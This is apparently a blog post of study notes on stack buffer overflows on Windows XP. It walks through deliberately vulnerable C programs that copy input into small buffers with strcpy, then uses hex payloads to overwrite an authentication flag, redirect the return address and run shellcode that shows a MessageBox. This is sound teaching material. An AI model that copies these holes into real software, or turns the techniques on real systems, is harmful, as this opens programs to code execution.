---
title: Exploit Learning Notes 001 Buffer Overflow
description: A bug that can cause software to do something beyond the scope of the vulnerability is called a vulnerability, this article writes some simple buffer overflow vulnerability exploitation shallow analysis
date: 2020-10-18 10:00:00+0800
categories:
    - Exploit
tags:
    - Windows
    - StackOverflow
---

> - Functional logic bugs (Bugs)
> - Security Logic Flaw (Vulnerability)
>
> [Click here to download this article with code, executable, shellcode file](exploit-study-01.zip)

Source: [Moeomu's blog](/posts/exploit-learning-notes-001-buffer-overflow/)

## PE concepts

### Mapping between PE file and virtual memory

- ImageBase: load base address, 0x00400000 for (.EXE), 0x10000000 for (.DLL)
- FileOffset: file offset address
- VirtualAddress: virtual address, is the address mapped to memory
- RelativeVirtualAddress: Relative virtual address, is the offset of the virtual address VA relative to the load base address

> VA = ImageBase + RVA

### Data Complementary Padding Rules

- When on disk, each section (.section) of the PE file is stored in 0x200 bytes, when the size of the section is less than 0x200, use 0x0 to fill, when the size of the section exceeds 0x200, allocate the next 0x200 size to this section
- When in memory, each section (.section) of a PE file is stored in units of 0x1000 bytes, with the same rules as above

> SectionOffset = RVA - FileOffset  
> FileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset  
>
> For example .text section RVA=0x1000, FileOffset=0x400, then SectionOffset=0xC00  
> Command file offset at 0x00404141 is 0x00404141 - 0x00400000 - (0x1000 - 0x400) = 0x3541

### Function calling convention

| C | SysCall | StdCall | BASIC | FORTRAN | PASCAL
| - | - | - | - | - | - |
| Parameter stack order | right->left | right->left | right->left | left->right | left->right | left->right | left->right
| Restore stack balance position | parent function | sub function | sub function | sub function | sub function | sub function

### Buffer overflow

> stack frames are adjacent, local variables are adjacent, and if the array is out of bounds, it overwrites the local variables and then the function return address  
> control program flow by flooding stack frame return address values

---

## ShellCode

### Exploit/ShellCode(Payload) division of labor

- Exploit's role is to precisely exploit some kind of vulnerability with the goal of hijacking the EIP
- ShellCode will execute malicious/goodwill code and is the attack payload
- ShellCode is generally generic, Exploit can only work for a specific vulnerability

### Example

This example uses simple password authentication to test the vulnerability

---

#### Buffer Overflow Control Program Flag

##### code (ExpStd0101)

> Compile environment: Windows XP SP3, Visual C++ 6, Debug  
> Experimental environment: Windows XP SP3

```c
#include <stdio.h>
#include <string.h>
#define PASSWORD "1234567"

int verify_password(char *password)
{
    int authenticated;
    char buffer[8];
    authenticated = strcmp(password, PASSWORD);
    strcpy(buffer, password);
    return authenticated;
}

int main()
{
    int valid_flag = 0;
    char password[1024];
    while(1)
    {
        printf("Input Number:");
        scanf("%s", password);
        valid_flag = verify_password(password);
        if(valid_flag)
        {
            printf("ERROR!");
        }
        else
        {
            printf("OK!");
            break;
        }
    }
}
```

##### Analysis (ExpStd0101)

- Simple analysis  
  - When input 999999999, its end `'\0'` will fill the 9th byte, exactly changing the lowest 1 byte of authenticated 0x1 to 0x0  
  - This is also related to strcmp function, if `str1<str2`, the authenticated value -1 is stored with inverse code `FFFFFFFF`, even if the low bit `FF` overflows to `00`, it is useless, so not all 8-bit characters can bypass authentication

- Further verification  
  - When 8 9s are entered, the 8-byte buffer is filled, covering 1 byte of authenticated space  
  - When 11 9s are entered, the 8-byte buffer fills up and covers 4 bytes of authenticated space, i.e. authenticated is completely overwritten and it is flushed as `0x003939393939`  
  - When 15 9s are input, the 8-byte buffer is filled, covering 4 bytes of authenticated space, and the space where this function EBP is located is also covered (the content is the parent function EBP)  
  - When 19 9s are entered, the 8-byte buffer is filled, the 4-byte authenticated space is overwritten, the 4-byte EBP space is overwritten, and the 4-byte return address is overwritten  

- Further verification
  - Since the keyboard can not enter some invisible characters, so replace it with read file authentication

---

#### Hard-coded address control program flow

Use FILE for file reading

##### code (ExpStd0102)

> Compile environment: Windows XP SP3, Visual C++ 6, Debug  
> Experimental environment: Windows XP SP3

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define PASSWORD "1234567"

int verify_password(char *password)
{
    int authenticated;
    char buffer[8];
    authenticated = strcmp(password, PASSWORD);
    strcpy(buffer, password);
    return authenticated;
}

int main()
{
    int valid_flag = 0;
    char password[1024];
    FILE * fp;
    if(!(fp = fopen("password.txt", "rw+")))
    {
        exit(0);
    }
    fscanf(fp, "%s", password);
    valid_flag = verify_password(password);
    if(valid_flag)
    {
        printf("ERROR!");
    }
    else
    {
        printf("OK!");
    }
    fclose(fp);
}

```

##### Analysis (ExpStd0102)

> first use a known address for shellcode, this address is compiled differently by different compilers and loaded differently by different systems, so it can only be used for testing

- Necessary information
  - Success branch address: `0x0040111F`
  - Since memory is stored in reverse order, these values should be written in reverse order
- Edit password.txt in hexadecimal as follows

```c
34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31
1F 11 40 00
```

- Run the program, at this point
  - The stack address `0x0012FB24` holds the return address of the function `verify_password`.
  - This has been flushed to `0040111F`, which is the success branch address
- The success branch address is used instead of the return address, but the program crashes after displaying success because the stack is not balanced

---

#### added attack load (ShellCode)

Increase the size of the buffer to carry the attack load  
Dynamically load DLL for API calls

##### code (ExpStd0103)

> Compile environment: Windows XP SP3, Visual C++ 6, Debug  
> Experimental environment: Windows XP SP3

```c
#include <stdio.h>
#include <windows.h>
#define PASSWORD "1234567"

int verify_password(char *password)
{
    int authenticated;
    char buffer[44];
    authenticated = strcmp(password, PASSWORD);
    strcpy(buffer, password);
    return authenticated;
}

int main()
{
    int valid_flag = 0;
    char password[1024];
    FILE * fp;
    LoadLibrary("user32.dll");
    if(!(fp = fopen("password.txt", "rw+")))
    {
        exit(0);
    }
    fscanf(fp, "%s", password);
    valid_flag = verify_password(password);
    if(valid_flag)
    {
        printf("ERROR!");
    }
    else
    {
        printf("OK!");
    }
    fclose(fp);
}

```

##### Analysis (ExpStd0103)

> Objective: To implant code to implement a popup MessageBox during program validation

- Necessary information
  - Array start address: `0x0012FAF0` (also the start address of ShellCode execution)
  - MessageBoxA address: `0x77D507EC`
  - Hexadecimal text: `4D6F656F6D75` (Moeomuoo)
- The machine code composed of

| Machine code(HEX) | Assembly code | Comments |
| -- | -- | --|
| 33DB | XOR EBX, EBX | Clear EBX to ensure there are no zeros in ShellCode (as of character)
| 53 | PUSH EBX | \0` at the end of the string
| 68 6D756F6F | PUSH 6F6F756D | Press in text byte muoo(0x6D756F6F)
| 68 4D6F656F | PUSH 6F656F4D | press in text byte moeo(0x4D6F656F)
| 8BC4 | MOV EAX, ESP | ESP stack top point to string Moeomuoo, hand over to EAX
| 53 | PUSH EBX | MB_OK
| 50 | PUSH EAX | Message
| 50 | PUSH EAX | Caption
| 53 | PUSH EBX | Handle
| B8 EC07D577 | MOV EAX, 0x77D507EC | Hard-code MessageBoxA's address into EAX
| FFD0 | CALL EAX | Call MessageBoxA

- Write the machine code to password.txt in order
  - Bytes 53-56 are filled with the return address (the start address of the Buffer), and the rest of the bytes are filled with 0x90
- The only imperfection is that the program crashes and quits

> Here is the final password.txt

```c
33 DB 53 68 6D 75 6F 6F  68 4D 6F 65 6F 8B C4 53
50 50 53 B8 EC 07 D5 77  FF D0 90 90 90 90 90 90
90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90
90 90 90 90 F0 FA 12 00
```

---

## Summary

This article discusses how to exploit buffer overflow vulnerabilities and the writing of ShellCode, but the shortcomings are hard-coded addresses and stack space shifts  
These issues are discussed in the next article
